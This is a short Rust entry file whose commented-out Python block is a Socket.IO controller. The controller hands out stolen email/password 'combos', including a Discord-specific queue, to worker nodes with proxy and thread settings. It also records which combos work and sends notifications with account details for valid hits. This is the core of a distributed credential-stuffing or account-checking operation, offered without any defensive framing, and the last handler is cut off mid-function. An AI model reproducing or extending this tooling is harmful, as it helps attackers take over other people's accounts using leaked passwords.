mod config;
mod db;
mod params;
mod rest;
mod socketio;

use rocket::tokio;

#[tokio::main]
async fn main() {
    rest::rocket().unwrap();
}

/*
@socketio.event
def fetch():
    data = db.fetchEmail()
    if not data:
        emit('no_email')
        return
    
    emit('combo', {
        'e': data.get('email'),
        'p': data.get('password'),
        'pr': params.parse(data.get('params')),
        'id': data.get('id')
    })

@socketio.event
def invalid(uuid):
    db.invalidateCombo(uuid)

@socketio.event
def validate(data):
    comboId = data.get('id')
    accountInfo = data.get('acc')

    #db.validateCombo(comboId)
    notifs.notify(comboId, accountInfo)

@socketio.event
def settings():
    print('Sending settings')
    emit('settings', {
        'threads': config.ThreadsPerNode,
        'proxies': []
    })

# on connection check if the node is authenticated
@socketio.event
def connect():
    if not authenticated():
        return False

    emit('authenticated')
    return True

@socketio.event
def disconnect():
    print('Node disconnected')
@socketio.event
def fetchDiscord():
    data = db.fetchDiscordEmail()
    if not data:
        emit('no_email')
        return
    
    emit('combo', {
        'e': data.get('email'),
        'p': data.get('password'),
        'pr': params.parse(data.get('params')),
        'id': data.get('id')
    })
@socketio.event
def fetchValidEmail():
    data = db.fetchValidEmail()
    if not data:
        emit('no_email')
        return
 */

